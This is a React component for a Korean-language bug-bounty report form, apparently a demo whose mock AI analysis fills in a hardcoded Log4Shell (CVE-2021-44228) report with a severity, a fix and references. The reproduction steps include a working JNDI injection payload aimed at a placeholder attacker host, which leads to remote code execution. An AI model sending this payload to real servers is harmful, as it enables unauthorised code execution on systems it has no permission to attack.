"use client";

import { useState } from "react";
import Header from "@/components/ui/Header";
import ProgramInfoCard from "./ProgramInfoCard";
import BasicInfoCard from "./BasicInfoCard";
import PoCTechnicalInfoCard from "./PoCTechnicalInfoCard";
import DetailedReportCard from "./DetailedReportCard";
import AIChatPanel from "./AIChatPanel";

export default function ScreenReport() {
  const [reportTitle, setReportTitle] = useState("");
  const [scope, setScope] = useState("");
  const [cweType, setCweType] = useState("");
  const [severity, setSeverity] = useState("");
  const [pocCode, setPocCode] = useState("");
  const [reproSteps, setReproSteps] = useState("");
  const [detailDescription, setDetailDescription] = useState("");
  const [securityImpact, setSecurityImpact] = useState("");
  const [solution, setSolution] = useState("");
  const [references, setReferences] = useState("");

  const handleAIAnalysis = (code: string) => {
    // Simulate processing delay
    setTimeout(() => {
      setReportTitle("Apache Log4j 2 JNDI Injection (Log4Shell)");
      setScope("Log4j-core library");
      setCweType("CWE-502: Deserialization of Untrusted Data");
      setSeverity("Critical");
      // Keep the user's code or use a refined version if needed. For now, we can append or replace.
      // Let's replace with a "refined" version for the demo effect.
      setPocCode(code);
      setReproSteps(
        `1. 공격자가 User-Agent 헤더에 JNDI LDAP 문자열을 포함하여 취약한 서버에 요청을 보냅니다.\n   Payload: \${jndi:ldap://attacker.com/exploit}\n2. 서버의 Log4j 라이브러리가 로그를 기록하면서 해당 문자열을 파싱합니다.\n3. JNDI Lookup 기능이 트리거되어 attacker.com의 악성 LDAP 서버에 연결을 시도합니다.\n4. 악성 Java 클래스가 다운로드되고 서버에서 실행되어 원격 코드 실행(RCE)이 발생합니다.`
      );
      setDetailDescription(
        "Apache Log4j 2 라이브러리의 JNDI 기능이 구성, 로그 메시지 및 매개변수에서 사용될 때, 공격자가 제어하는 LDAP 및 기타 JNDI 관련 엔드포인트로부터 보호되지 않습니다. 이로 인해 공격자는 임의의 코드를 로드하고 실행할 수 있습니다."
      );
      setSecurityImpact(
        "공격자는 서버의 권한으로 임의의 코드를 실행할 수 있으며, 이는 데이터 유출, 시스템 장악, 서비스 거부 등 심각한 보안 사고로 이어질 수 있습니다."
      );
      setSolution(
        "Log4j 2.15.0 버전 이상으로 업그레이드하십시오. 만약 업그레이드가 불가능한 경우, 'log4j2.formatMsgNoLookups' 시스템 속성을 'true'로 설정하여 Lookup 기능을 비활성화하십시오."
      );
      setReferences(
        "https://logging.apache.org/log4j/2.x/security.html\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-44228"
      );
    }, 10000);
  };

  const handleSubmit = () => {
    // TODO: Implement actual submission logic
    alert("리포트가 제출되었습니다!");
  };

  // Validation: Check if all required fields are filled (references is optional)
  const isFormValid =
    reportTitle.trim() !== "" &&
    scope.trim() !== "" &&
    cweType.trim() !== "" &&
    severity.trim() !== "" &&
    pocCode.trim() !== "" &&
    reproSteps.trim() !== "" &&
    detailDescription.trim() !== "" &&
    securityImpact.trim() !== "" &&
    solution.trim() !== "";

  return (
    <div className="min-h-screen w-full bg-white">
      {/* Top Navigation */}
      <Header />

      {/* Main Content */}
      <div className="grid min-h-[calc(100vh-73px)] w-full grid-cols-1 gap-8 bg-[#F8F9FA] px-4 pt-8 pb-8 lg:grid-cols-[1fr_400px] lg:px-[18vw]">
        {/* Left Column - Form */}
        <div className="flex flex-col items-start gap-6">
          {/* Program Info Card */}
          <ProgramInfoCard />

          {/* Basic Information Card */}
          <BasicInfoCard
            reportTitle={reportTitle}
            setReportTitle={setReportTitle}
            scope={scope}
            setScope={setScope}
            cweType={cweType}
            setCweType={setCweType}
            severity={severity}
            setSeverity={setSeverity}
          />

          {/* PoC & Technical Info Card */}
          <PoCTechnicalInfoCard
            pocCode={pocCode}
            setPocCode={setPocCode}
            reproSteps={reproSteps}
            setReproSteps={setReproSteps}
          />

          {/* Detailed Report Card */}
          <DetailedReportCard
            detailDescription={detailDescription}
            setDetailDescription={setDetailDescription}
            securityImpact={securityImpact}
            setSecurityImpact={setSecurityImpact}
            solution={solution}
            setSolution={setSolution}
            references={references}
            setReferences={setReferences}
          />

          {/* Submit Button */}
          <div className="flex w-full justify-end">
            <button
              onClick={handleSubmit}
              disabled={!isFormValid}
              className={`group relative flex items-center gap-3 overflow-hidden rounded-lg px-8 py-4 font-semibold shadow-lg transition-all duration-300 ${
                isFormValid
                  ? "cursor-pointer bg-gradient-to-r from-blue-600 to-blue-700 text-white hover:from-blue-700 hover:to-blue-800 hover:shadow-xl active:scale-95"
                  : "cursor-not-allowed bg-gray-300 text-gray-500 opacity-60"
              }`}
            >
              <span className="relative z-10 text-base">리포트 제출하기</span>
              <svg
                className={`relative z-10 h-5 w-5 transition-transform duration-300 ${
                  isFormValid ? "group-hover:translate-x-1" : ""
                }`}
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M13 7l5 5m0 0l-5 5m5-5H6"
                />
              </svg>
              {isFormValid && (
                <div className="absolute inset-0 bg-gradient-to-r from-blue-400 to-blue-500 opacity-0 transition-opacity duration-300 group-hover:opacity-20" />
              )}
            </button>
          </div>
        </div>

        {/* Right Column - AI Chat Panel */}
        <div className="flex flex-col gap-6">
          <AIChatPanel onAnalyze={handleAIAnalysis} />
        </div>
      </div>
    </div>
  );
}
